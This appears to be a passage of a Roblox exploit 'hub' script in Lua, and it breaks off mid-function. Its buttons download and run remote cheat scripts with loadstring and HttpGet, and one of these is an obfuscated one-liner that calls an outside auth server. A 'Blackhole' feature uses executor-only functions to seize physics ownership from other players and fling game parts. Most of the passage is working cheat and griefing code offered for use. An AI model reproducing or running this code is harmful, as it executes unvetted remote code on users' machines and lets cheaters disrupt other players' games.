MM2hub.Text = "MM2"
MM2hub.TextColor3 = Color3.fromRGB(238, 238, 238)
MM2hub.TextSize = 30.000
MM2hub.MouseButton1Click:Connect(function()
	getgenv().mainKey = "nil"

	local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
end)
UICorner_24.Parent = MM2hub

BABFThub.Name = "BABFThub"
BABFThub.Parent = GameHubsFrame
BABFThub.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
BABFThub.Position = UDim2.new(0.641732335, 0, 0.459440231, 0)
BABFThub.Size = UDim2.new(0, 143, 0, 43)
BABFThub.Font = Enum.Font.Nunito
BABFThub.Text = "Build A Boat"
BABFThub.TextColor3 = Color3.fromRGB(238, 238, 238)
BABFThub.TextSize = 30.000
BABFThub.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/littlegui/main/Build-A-Boat'))()
end)
UICorner_25.Parent = BABFThub

Description_2.Name = "Description"
Description_2.Parent = GameHubsFrame
Description_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Description_2.BackgroundTransparency = 1.000
Description_2.Position = UDim2.new(0.0472440943, 0, 0.840236723, 0)
Description_2.Size = UDim2.new(0, 444, 0, 54)
Description_2.Font = Enum.Font.Nunito
Description_2.Text = "Hubs to autofarm or gain an advantage and dominate in games"
Description_2.TextColor3 = Color3.fromRGB(238, 238, 238)
Description_2.TextSize = 27.000
Description_2.TextStrokeColor3 = Color3.fromRGB(238, 238, 238)
Description_2.TextWrapped = true

AChub.Name = "AChub"
AChub.Parent = GameHubsFrame
AChub.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
AChub.Position = UDim2.new(0.0492126346, 0, 0.31107229, 0)
AChub.Size = UDim2.new(0, 143, 0, 43)
AChub.Font = Enum.Font.Nunito
AChub.Text = "Anime Clickers"
AChub.TextColor3 = Color3.fromRGB(238, 238, 238)
AChub.TextSize = 26.000
AChub.TextWrapped = true
AChub.MouseButton1Click:Connect(function()
	pcall(function()
		loadstring(game:HttpGet("http://riverhub.xyz/" .. tostring(game.PlaceId) .. ".lua"))()
	end)
end)
UICorner_26.Parent = AChub

FlingScriptsFrame.Name = "FlingScriptsFrame"
FlingScriptsFrame.Parent = Frame
FlingScriptsFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FlingScriptsFrame.BackgroundTransparency = 1.000
FlingScriptsFrame.Position = UDim2.new(0.230303034, 0, 0.165841579, 0)
FlingScriptsFrame.Size = UDim2.new(0, 508, 0, 337)
FlingScriptsFrame.Visible = false

CreeperSpider.Name = "CreeperSpider"
CreeperSpider.Parent = FlingScriptsFrame
CreeperSpider.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
CreeperSpider.Position = UDim2.new(0.0492125973, 0, 0.168639049, 0)
CreeperSpider.Size = UDim2.new(0, 143, 0, 43)
CreeperSpider.Font = Enum.Font.Nunito
CreeperSpider.Text = "Creeper/Spider"
CreeperSpider.TextColor3 = Color3.fromRGB(238, 238, 238)
CreeperSpider.TextSize = 26.000
CreeperSpider.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character.Head.face:Remove()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/XeneonPlays/Nexo/main/NexoPD'),true))()

	IT = Instance.new
	CF = CFrame.new
	VT = Vector3.new
	RAD = math.rad
	C3 = Color3.new
	UD2 = UDim2.new
	BRICKC = BrickColor.new
	ANGLES = CFrame.Angles
	EULER = CFrame.fromEulerAnglesXYZ
	COS = math.cos
	ACOS = math.acos
	SIN = math.sin
	ASIN = math.asin
	ABS = math.abs
	MRANDOM = math.random
	FLOOR = math.floor

	speed = 1
	sine = 1
	srv = game:GetService('RunService')

	function hatset(yes,part,c1,c0,nm)
		reanim[yes].Handle.AccessoryWeld.Part1=reanim[part]
		reanim[yes].Handle.AccessoryWeld.C1=c1 or CFrame.new()
		reanim[yes].Handle.AccessoryWeld.C0=c0 or CFrame.new()--3bbb322dad5929d0d4f25adcebf30aa5
		if nm==true then
			noplsmesh(yes)
		end
	end

	--put the hat script converted below

	reanim = game.Players.LocalPlayer.Character.CWExtra.NexoPD
	RJ = reanim.HumanoidRootPart.RootJoint
	RS = reanim.Torso['Right Shoulder']
	LS = reanim.Torso['Left Shoulder']
	RH = reanim.Torso['Right Hip']
	LH = reanim.Torso['Left Hip']
	Root = reanim.HumanoidRootPart
	NECK = reanim.Torso.Neck
	NECK.C0 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	NECK.C1 = CF(0,-0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	RJ.C1 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	RJ.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	RS.C1 = CF(-0.5,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	LS.C1 = CF(0.5,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	RH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	LH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	RH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	LH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	RS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	LS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))

	Mode='1'

	mousechanger=game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(k)
		if k == '1' then-- first mode
			Mode='1'
		elseif k == '2' then-- second mode
			Mode='2'
		end
	end)

	coroutine.wrap(function()
		while true do -- anim changer
			if HumanDied then mousechanger:Disconnect() break end
			sine = sine + speed
			local rlegray = Ray.new(reanim["Right Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
			local rlegpart, rlegendPoint = workspace:FindPartOnRay(rlegray, char)
			local llegray = Ray.new(reanim["Left Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
			local llegpart, llegendPoint = workspace:FindPartOnRay(llegray, char)
			local rightvector = (Root.Velocity * Root.CFrame.rightVector).X + (Root.Velocity * Root.CFrame.rightVector).Z
			local lookvector = (Root.Velocity * Root.CFrame.lookVector).X + (Root.Velocity * Root.CFrame.lookVector).Z
			if lookvector > reanim.Humanoid.WalkSpeed then
				lookvector = reanim.Humanoid.WalkSpeed
			end
			if lookvector < -reanim.Humanoid.WalkSpeed then
				lookvector = -reanim.Humanoid.WalkSpeed
			end
			if rightvector > reanim.Humanoid.WalkSpeed then
				rightvector = reanim.Humanoid.WalkSpeed
			end
			if rightvector < -reanim.Humanoid.WalkSpeed then
				rightvector = -reanim.Humanoid.WalkSpeed
			end
			local lookvel = lookvector / reanim.Humanoid.WalkSpeed
			local rightvel = rightvector / reanim.Humanoid.WalkSpeed
			if Mode == '1' then
				if Root.Velocity.Magnitude < 2 then -- idle
					NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/20),0+0.05*math.cos(sine/20),0+0*math.cos(sine/20))*ANGLES(RAD(0+0*math.cos(sine/20)),RAD(0+0*math.cos(sine/20)),RAD(0+0*math.cos(sine/20))),.3)
					RS.C0 = RS.C0:Lerp(CF(0.4+0*math.cos(sine/13),-1.5+0*math.cos(sine/13),0.4+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(-35+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					LS.C0 = LS.C0:Lerp(CF(-0.4+0*math.cos(sine/13),-1.5+0*math.cos(sine/13),0.4+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(35+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					RH.C0 = RH.C0:Lerp(CF(0.8+0*math.cos(sine/13),-1+0*math.cos(sine/13),-0.7+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(-35+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					LH.C0 = LH.C0:Lerp(CF(-0.8+0*math.cos(sine/13),-1+0*math.cos(sine/13),-0.7+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(35+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					--idle clerp here
				elseif Root.Velocity.Magnitude < 20 then -- walk
					NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/20),0+0.05*math.cos(sine/20),0+0*math.cos(sine/20))*ANGLES(RAD(0+0*math.cos(sine/20)),RAD(0+0*math.cos(sine/20)),RAD(0+0*math.cos(sine/20))),.3)
					RS.C0 = RS.C0:Lerp(CF(0.4+0*math.cos(sine/13),-1.5+0*math.cos(sine/13),0.4+0*math.cos(sine/13))*ANGLES(RAD(0+-15*math.cos(sine/13)),RAD(-35+0*math.cos(sine/13)),RAD(0+5*math.cos(sine/13))),.3)
					LS.C0 = LS.C0:Lerp(CF(-0.4+0*math.cos(sine/13),-1.5+0*math.cos(sine/13),0.4+0*math.cos(sine/13))*ANGLES(RAD(0+15*math.cos(sine/13)),RAD(35+0*math.cos(sine/13)),RAD(0+-5*math.cos(sine/13))),.3)
					RH.C0 = RH.C0:Lerp(CF(0.8+0*math.cos(sine/13),-1+0*math.cos(sine/13),-0.7+0*math.cos(sine/13))*ANGLES(RAD(0+15*math.cos(sine/13)),RAD(-35+0*math.cos(sine/13)),RAD(0+-5*math.cos(sine/13))),.3)
					LH.C0 = LH.C0:Lerp(CF(-0.8+0*math.cos(sine/13),-1+0*math.cos(sine/13),-0.7+0*math.cos(sine/13))*ANGLES(RAD(0+-15*math.cos(sine/13)),RAD(35+0*math.cos(sine/13)),RAD(0+5*math.cos(sine/13))),.3)
					--walk clerp here
				elseif Root.Velocity.Magnitude > 20 then -- run
					NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/20),0+0.05*math.cos(sine/20),0+0*math.cos(sine/20))*ANGLES(RAD(0+0*math.cos(sine/20)),RAD(0+0*math.cos(sine/20)),RAD(0+0*math.cos(sine/20))),.3)
					RS.C0 = RS.C0:Lerp(CF(0.4+0*math.cos(sine/13),-1.5+0*math.cos(sine/13),0.4+0*math.cos(sine/13))*ANGLES(RAD(0+-15*math.cos(sine/13)),RAD(-35+0*math.cos(sine/13)),RAD(0+5*math.cos(sine/13))),.3)
					LS.C0 = LS.C0:Lerp(CF(-0.4+0*math.cos(sine/13),-1.5+0*math.cos(sine/13),0.4+0*math.cos(sine/13))*ANGLES(RAD(0+15*math.cos(sine/13)),RAD(35+0*math.cos(sine/13)),RAD(0+-5*math.cos(sine/13))),.3)
					RH.C0 = RH.C0:Lerp(CF(0.8+0*math.cos(sine/13),-1+0*math.cos(sine/13),-0.7+0*math.cos(sine/13))*ANGLES(RAD(0+15*math.cos(sine/13)),RAD(-35+0*math.cos(sine/13)),RAD(0+-5*math.cos(sine/13))),.3)
					LH.C0 = LH.C0:Lerp(CF(-0.8+0*math.cos(sine/13),-1+0*math.cos(sine/13),-0.7+0*math.cos(sine/13))*ANGLES(RAD(0+-15*math.cos(sine/13)),RAD(35+0*math.cos(sine/13)),RAD(0+5*math.cos(sine/13))),.3)
					--run clerp here
				end
			elseif Mode == '2' then
				if Root.Velocity.y > 1 then -- jump
					NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/20),0+0.05*math.cos(sine/20),0+0*math.cos(sine/20))*ANGLES(RAD(0+0*math.cos(sine/20)),RAD(0+0*math.cos(sine/20)),RAD(0+0*math.cos(sine/20))),.3)
					RS.C0 = RS.C0:Lerp(CF(1+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(150+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(25+0*math.cos(sine/13))),.3)
					LS.C0 = LS.C0:Lerp(CF(-1+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(150+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(-25+0*math.cos(sine/13))),.3)
					RH.C0 = RH.C0:Lerp(CF(2+0*math.cos(sine/13),1+0*math.cos(sine/13),-0.6+0*math.cos(sine/13))*ANGLES(RAD(150+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					LH.C0 = LH.C0:Lerp(CF(-2+0*math.cos(sine/13),1+0*math.cos(sine/13),-0.6+0*math.cos(sine/13))*ANGLES(RAD(150+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					--jump clerp here
				elseif Root.Velocity.y < -1 then -- fall
					NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/20),0+0.05*math.cos(sine/20),0+0*math.cos(sine/20))*ANGLES(RAD(0+0*math.cos(sine/20)),RAD(0+0*math.cos(sine/20)),RAD(0+0*math.cos(sine/20))),.3)
					RS.C0 = RS.C0:Lerp(CF(1+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(150+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(25+0*math.cos(sine/13))),.3)
					LS.C0 = LS.C0:Lerp(CF(-1+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(150+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(-25+0*math.cos(sine/13))),.3)
					RH.C0 = RH.C0:Lerp(CF(2+0*math.cos(sine/13),1+0*math.cos(sine/13),-0.6+0*math.cos(sine/13))*ANGLES(RAD(150+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					LH.C0 = LH.C0:Lerp(CF(-2+0*math.cos(sine/13),1+0*math.cos(sine/13),-0.6+0*math.cos(sine/13))*ANGLES(RAD(150+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					--fall clerp here
				elseif Root.Velocity.Magnitude < 2 then -- idle
					NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/20),0+0.05*math.cos(sine/20),0+0*math.cos(sine/20))*ANGLES(RAD(0+0*math.cos(sine/20)),RAD(0+0*math.cos(sine/20)),RAD(0+0*math.cos(sine/20))),.3)
					RS.C0 = RS.C0:Lerp(CF(1+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(25+0*math.cos(sine/13))),.3)
					LS.C0 = LS.C0:Lerp(CF(-1+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(-25+0*math.cos(sine/13))),.3)
					RH.C0 = RH.C0:Lerp(CF(2+0*math.cos(sine/13),-1+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					LH.C0 = LH.C0:Lerp(CF(-2+0*math.cos(sine/13),-1+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					--idle clerp here
				elseif Root.Velocity.Magnitude < 20 then -- walk
					NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/20),0+0.05*math.cos(sine/20),0+0*math.cos(sine/20))*ANGLES(RAD(0+0*math.cos(sine/20)),RAD(0+0*math.cos(sine/20)),RAD(0+0*math.cos(sine/20))),.3)
					RS.C0 = RS.C0:Lerp(CF(1+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+25*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(25+0*math.cos(sine/13))),.3)
					LS.C0 = LS.C0:Lerp(CF(-1+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+-25*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(-25+0*math.cos(sine/13))),.3)
					RH.C0 = RH.C0:Lerp(CF(2+0*math.cos(sine/13),-1+0*math.cos(sine/13),0+-0.5*math.cos(sine/13))*ANGLES(RAD(0+25*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					LH.C0 = LH.C0:Lerp(CF(-2+0*math.cos(sine/13),-1+0*math.cos(sine/13),0+0.5*math.cos(sine/13))*ANGLES(RAD(0+-25*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					--walk clerp here
				elseif Root.Velocity.Magnitude > 20 then -- run
					NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/20),0+0.05*math.cos(sine/20),0+0*math.cos(sine/20))*ANGLES(RAD(0+0*math.cos(sine/20)),RAD(0+0*math.cos(sine/20)),RAD(0+0*math.cos(sine/20))),.3)
					RS.C0 = RS.C0:Lerp(CF(1+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+25*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(25+0*math.cos(sine/13))),.3)
					LS.C0 = LS.C0:Lerp(CF(-1+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+-25*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(-25+0*math.cos(sine/13))),.3)
					RH.C0 = RH.C0:Lerp(CF(2+0*math.cos(sine/13),-1+0*math.cos(sine/13),0+-0.5*math.cos(sine/13))*ANGLES(RAD(0+25*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					LH.C0 = LH.C0:Lerp(CF(-2+0*math.cos(sine/13),-1+0*math.cos(sine/13),0+0.5*math.cos(sine/13))*ANGLES(RAD(0+-25*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					--run clerp here
				end
			end
			srv.RenderStepped:Wait()
		end
	end)()
end)
UICorner_27.Parent = CreeperSpider

Blackhole.Name = "Blackhole"
Blackhole.Parent = FlingScriptsFrame
Blackhole.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
Blackhole.Position = UDim2.new(0.342519701, 0, 0.165671691, 0)
Blackhole.Size = UDim2.new(0, 143, 0, 43)
Blackhole.Font = Enum.Font.Nunito
Blackhole.Text = "Blackhole"
Blackhole.TextColor3 = Color3.fromRGB(238, 238, 238)
Blackhole.TextSize = 32.000
Blackhole.MouseButton1Click:Connect(function()
	local UserInputService = game:GetService("UserInputService")
	local Mouse = game:GetService("Players").LocalPlayer:GetMouse()
	local Folder = Instance.new("Folder", game:GetService("Workspace"))
	local Part = Instance.new("Part", Folder)
	local Attachment1 = Instance.new("Attachment", Part)
	Part.Anchored = true
	Part.CanCollide = false
	Part.Transparency = 1
	local Updated = Mouse.Hit + Vector3.new(0, 5, 0)
	local NetworkAccess = coroutine.create(function()
		settings().Physics.AllowSleep = false
		while game:GetService("RunService").RenderStepped:Wait() do
			for _, Players in next, game:GetService("Players"):GetPlayers() do
				if Players ~= game:GetService("Players").LocalPlayer then
					Players.MaximumSimulationRadius = 0 
					sethiddenproperty(Players, "SimulationRadius", 0) 
				end 
			end
			game:GetService("Players").LocalPlayer.MaximumSimulationRadius = math.pow(math.huge,math.huge)
			setsimulationradius(math.huge) 
		end 
	end) 
	coroutine.resume(NetworkAccess)
	local function ForcePart(v)
		if v:IsA("Part") and v.Anchored == false and v.Parent:FindFirstChild("Humanoid") == nil and v.Parent:FindFirstChild("Head") == nil and v.Name ~= "Handle" then
			Mouse.TargetFilter = v
			for _, x in next, v:GetChildren() do
				if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
					x:Destroy()
				end
			end
			if v:FindFirstChild("Attachment") then
				v:FindFirstChild("Attachment"):Destroy()
			end
			if v:FindFirstChild("AlignPosition") then
				v:FindFirstChild("AlignPosition"):Destroy()
			end
			if v:FindFirstChild("Torque") then
				v:FindFirstChild("Torque"):Destroy()
			end
			v.CanCollide = false
			local Torque = Instance.new("Torque", v)
			Torque.Torque = Vector3.new(100000, 100000, 100000)
			local AlignPosition = Instance.new("AlignPosition", v)
			local Attachment2 = Instance.new("Attachment", v)
			Torque.Attachment0 = Attachment2
			AlignPosition.MaxForce = 9999999999999999
			AlignPosition.MaxVelocity = math.huge
			AlignPosition.Responsiveness = 200
			AlignPosition.Attachment0 = Attachment2 
			AlignPosition.Attachment1 = Attachment1
		end
	end
	for _, v in next, game:GetService("Workspace"):GetDescendants() do
		ForcePart(v)
	end
	game:GetService("Workspace").DescendantAdded:Connect(function(v)
		ForcePart(v)
	end)
	UserInputService.InputBegan:Connect(function(Key, Chat)
		if Key.KeyCode == Enum.KeyCode.E and not Chat then
			Updated = Mouse.Hit + Vector3.new(0, 5, 0)
		end
	end)
	spawn(function()
		while game:GetService("RunService").RenderStepped:Wait() do
			Attachment1.WorldCFrame = Updated
		end
	end)
end)
UICorner_28.Parent = Blackhole

Soldier.Name = "Soldier"
Soldier.Parent = FlingScriptsFrame
Soldier.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
Soldier.Position = UDim2.new(0.641732335, 0, 0.165671691, 0)
Soldier.Size = UDim2.new(0, 143, 0, 43)
Soldier.Font = Enum.Font.Nunito
Soldier.Text = "Soldier AI"
Soldier.TextColor3 = Color3.fromRGB(238, 238, 238)
Soldier.TextSize = 32.000
Soldier.MouseButton1Click:Connect(function()
	FakeLimbs = {["Head"] = nil,["Torso1"] = nil,["Torso2"] = nil,["Right Arm"] = nil,["Left Arm"] = nil,["Right Leg"] = nil,["Left Leg"] = nil}
	Accessorys = {}

	local ModelsRequire = game:GetObjects("rbxassetid://8005457125")
	local MFolder = ModelsRequire[1]


	local HumanRoot = game.Players.LocalPlayer.Character.HumanoidRootPart
	function StickAcc(Part0,Part1,Angle,Position)
		Part0:FindFirstChildWhichIsA("Weld"):Destroy()
		local AlignPos = Instance.new('AlignPosition', Part1)
		AlignPos.ApplyAtCenterOfMass = true;
		AlignPos.MaxForce = 67752;
		AlignPos.MaxVelocity = math.huge/9e110;
		AlignPos.ReactionForceEnabled = false;
		AlignPos.Responsiveness = 200;
		AlignPos.RigidityEnabled = false;
		local AlignOri = Instance.new('AlignOrientation', Part1)
		AlignOri.MaxAngularVelocity = math.huge/9e110;
		AlignOri.MaxTorque = 67752;
		AlignOri.PrimaryAxisOnly = false;
		AlignOri.ReactionTorqueEnabled = false;
		AlignOri.Responsiveness = 200;
		AlignOri.RigidityEnabled = false;
		local AttachmentA=Instance.new('Attachment',Part1)
		local AttachmentB=Instance.new('Attachment',Part0)
		local AttachmentC=Instance.new('Attachment',Part1)
		local AttachmentD=Instance.new('Attachment',Part0)
		AlignPos.Attachment1 = AttachmentA;
		AlignPos.Attachment0 = AttachmentB;
		AlignOri.Attachment1 = AttachmentC;
		AlignOri.Attachment0 = AttachmentD;
		AttachmentC.Orientation = Angle
		Part0.Parent = FakeCharacter
		if Position then
			AttachmentA.Position = Position
		end
		game:GetService("RunService").Heartbeat:connect(function()
			Part0.Velocity = Vector3.new(0,35,0)
		end)
	end

	function StickParts(Part0,Part1,Angle,Position)
		Part0:FindFirstChildWhichIsA("Weld"):Destroy()
		Part0:FindFirstChildWhichIsA("SpecialMesh"):Destroy()
		local AlignPos = Instance.new('AlignPosition', Part1)
		AlignPos.ApplyAtCenterOfMass = true;
		AlignPos.MaxForce = 67752;
		AlignPos.MaxVelocity = math.huge/9e110;
		AlignPos.ReactionForceEnabled = false;
		AlignPos.Responsiveness = 200;
		AlignPos.RigidityEnabled = false;
		local AlignOri = Instance.new('AlignOrientation', Part1)
		AlignOri.MaxAngularVelocity = math.huge/9e110;
		AlignOri.MaxTorque = 67752;
		AlignOri.PrimaryAxisOnly = false;
		AlignOri.ReactionTorqueEnabled = false;
		AlignOri.Responsiveness = 200;
		AlignOri.RigidityEnabled = false;
		local AttachmentA=Instance.new('Attachment',Part1)
		local AttachmentB=Instance.new('Attachment',Part0)
		local AttachmentC=Instance.new('Attachment',Part1)
		local AttachmentD=Instance.new('Attachment',Part0)
		AlignPos.Attachment1 = AttachmentA;
		AlignPos.Attachment0 = AttachmentB;
		AlignOri.Attachment1 = AttachmentC;
		AlignOri.Attachment0 = AttachmentD;
		AttachmentC.Orientation = Angle
		AttachmentC.Name = "Orientation"
		Part0.Parent = FakeCharacter
		if Position then
			AttachmentA.Position = Position
		end
		s = game:GetService("RunService").Heartbeat:connect(function()
			Part0.Velocity = Vector3.new(0,50,0)
		end)
		spawn(function()
			while true do
				wait()
				if HumanDied then
					s:Disconnect()
					break
				end
			end
		end)
	end


	for i, part in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
		if part:IsA("Accessory") then
			if part.Handle.Size == Vector3.new(1, 1, 2) then
				if FakeLimbs["Right Arm"] == nil then
					FakeLimbs["Right Arm"] = part.Handle
				elseif FakeLimbs["Left Arm"] == nil then
					FakeLimbs["Left Arm"] = part.Handle

				elseif FakeLimbs["Right Leg"] == nil then
					FakeLimbs["Right Leg"] = part.Handle
				elseif FakeLimbs["Left Leg"] == nil then
					FakeLimbs["Left Leg"] = part.Handle
				elseif FakeLimbs["Torso1"] == nil then
					FakeLimbs["Torso1"] = part.Handle
				elseif FakeLimbs["Torso2"] == nil then
					FakeLimbs["Torso2"] = part.Handle
				end
			elseif part.Handle.Size == Vector3.new(1,1,1) then
				FakeLimbs["Head"] = part.Handle
			end
		end
	end
	game.Players.LocalPlayer.Character.Archivable = true














	-- Kill Player
	FakeCharacter = MFolder
	FakeCharacter.Parent = workspace

	local m4 = FakeCharacter.M4












	do



		Bypass = "death"
		if not Bypass then Bypass = "limbs" end
		HumanDied = false

		CountSCIFIMOVIELOL = 1
		function SCIFIMOVIELOL(Part0,Part1,Position,Angle)
			local AlignPos = Instance.new('AlignPosition', Part1); AlignPos.Name = "AliP_"..CountSCIFIMOVIELOL
			AlignPos.ApplyAtCenterOfMass = true;
			AlignPos.MaxForce = 67752;
			AlignPos.MaxVelocity = math.huge/9e110;
			AlignPos.ReactionForceEnabled = false;
			AlignPos.Responsiveness = 200;
			AlignPos.RigidityEnabled = false;
			local AlignOri = Instance.new('AlignOrientation', Part1); AlignOri.Name = "AliO_"..CountSCIFIMOVIELOL
			AlignOri.MaxAngularVelocity = math.huge/9e110;
			AlignOri.MaxTorque = 67752;
			AlignOri.PrimaryAxisOnly = false;
			AlignOri.ReactionTorqueEnabled = false;
			AlignOri.Responsiveness = 200;
			AlignOri.RigidityEnabled = false;
			local AttachmentA=Instance.new('Attachment',Part1); AttachmentA.Name = "AthP_"..CountSCIFIMOVIELOL
			local AttachmentB=Instance.new('Attachment',Part0); AttachmentB.Name = "AthP_"..CountSCIFIMOVIELOL
